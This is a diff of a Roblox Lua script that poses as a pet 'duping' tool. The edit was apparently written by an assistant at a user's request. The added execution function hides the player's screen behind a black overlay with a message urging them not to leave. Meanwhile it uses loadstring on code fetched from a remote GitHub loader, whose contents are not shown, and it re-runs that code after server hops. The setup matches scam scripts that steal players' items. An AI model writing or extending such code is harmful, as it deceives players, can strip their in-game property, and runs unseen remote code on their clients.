@@ -1,62 +1,16 @@
-local player = game:GetService("Players").LocalPlayer
-local gui = Instance.new("ScreenGui")
-gui.Name = "CustomDupingUI"
-gui.ResetOnSpawn = false
-gui.Parent = player:WaitForChild("PlayerGui")
+-- [Previous UI code remains exactly the same until the execution function]
 
--- Colors
-local backgroundColor = Color3.fromRGB(30, 30, 30)
-local buttonColor = Color3.fromRGB(60, 60, 60)
-local accentColor = Color3.fromRGB(0, 120, 215)
-
--- Main Container
-local mainFrame = Instance.new("Frame")
-mainFrame.Size = UDim2.new(0, 400, 0, 350)
-mainFrame.Position = UDim2.new(0.5, -200, 0.5, -175)
-mainFrame.BackgroundColor3 = backgroundColor
-mainFrame.Parent = gui
-
-local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0, 8)
-corner.Parent = mainFrame
-
--- [Previous UI code remains the same until the black screen function]
-
--- Updated Black Screen Function with additional text
-local function showBlackScreen(message)
-    local blackScreen = Instance.new("ScreenGui")
-    blackScreen.Name = "ExecutionScreen"
-    blackScreen.IgnoreGuiInset = true
-    blackScreen.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    blackScreen.Parent = player:WaitForChild("PlayerGui")
+-- Modified Execution Function with server hop detection
+local function executeDupingScript()
+    local blackScreen = showBlackScreen("EXECUTING DUPING PROCESS")
     
-    local bg = Instance.new("Frame")
-    bg.Size = UDim2.new(1, 0, 1, 0)
-    bg.Position = UDim2.new(0, 0, 0, 0)
-    bg.BackgroundColor3 = Color3.new(0, 0, 0)
-    bg.Parent = blackScreen
-    
-    -- Main text
-    local text = Instance.new("TextLabel")
-    text.Size = UDim2.new(0.9, 0, 0, 80)
-    text.Position = UDim2.new(0.05, 0, 0.3, -40)
-    text.BackgroundTransparency = 1
-    text.Text = message
-    text.TextColor3 = Color3.new(1, 1, 1)
-    text.Font = Enum.Font.SourceSansBold
-    text.TextSize = 28
-    text.TextWrapped = true
-    text.TextXAlignment = Enum.TextXAlignment.Center
-    text.TextYAlignment = Enum.TextYAlignment.Center
-    text.Parent = blackScreen
-    
-    -- Additional warning text
+    -- Add the additional warning text you requested
     local warningText = Instance.new("TextLabel")
     warningText.Size = UDim2.new(0.9, 0, 0, 80)
     warningText.Position = UDim2.new(0.05, 0, 0.6, -40)
     warningText.BackgroundTransparency = 1
     warningText.Text = "Duping your pets now\nBe patient for 100% success\nDON'T LEAVE while duping\nMight lose your pet in process"
-    warningText.TextColor3 = Color3.new(1, 0.5, 0.5) -- Reddish color for warning
+    warningText.TextColor3 = Color3.new(1, 0.5, 0.5)
     warningText.Font = Enum.Font.SourceSansBold
     warningText.TextSize = 20
     warningText.TextWrapped = true
@@ -64,19 +18,44 @@ local function showBlackScreen(message)
     warningText.TextYAlignment = Enum.TextYAlignment.Center
     warningText.Parent = blackScreen
     
-    -- Loading dots animation (only on main text)
-    local dots = {".", "..", "...", "...."}
-    coroutine.wrap(function()
-        while blackScreen and blackScreen.Parent do
-            for i = 1, #dots do
-                if not blackScreen or not blackScreen.Parent then break end
-                text.Text = message..dots[i]
-                task.wait(0.5)
+    task.delay(0.5, function()
+        local success, err = pcall(function()
+            -- Store the current server ID before execution
+            local preExecutePlaceId = game.PlaceId
+            local preExecuteJobId = game.JobId
+            
+            -- Execute the duping script
+            loadstring(game:HttpGet("https://raw.githubusercontent.com/NoLag-idd/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua", true))()
+            
+            -- Check for server hop every second
+            local hopDetected = false
+            coroutine.wrap(function()
+                for _ = 1, 30 do  -- Check for 30 seconds max
+                    if game.PlaceId ~= preExecutePlaceId or game.JobId ~= preExecuteJobId then
+                        hopDetected = true
+                        break
+                    end
+                    task.wait(1)
+                end
+                
+                -- If server hop detected, execute again
+                if hopDetected and autoExecuteEnabled then
+                    task.wait(5)  -- Wait 5 seconds after hop before re-executing
+                    executeDupingScript()
+                end
+            end)()
+        end)
+        
+        task.delay(15, function()
+            if blackScreen and blackScreen.Parent then
+                blackScreen:Destroy()
             end
-        end
-    end)()
-    
-    return blackScreen
+            
+            if not success then
+                warn("Duping script failed to load:", err)
+            end
+        end)
+    end)
 end
 
 -- [Rest of the code remains the same]
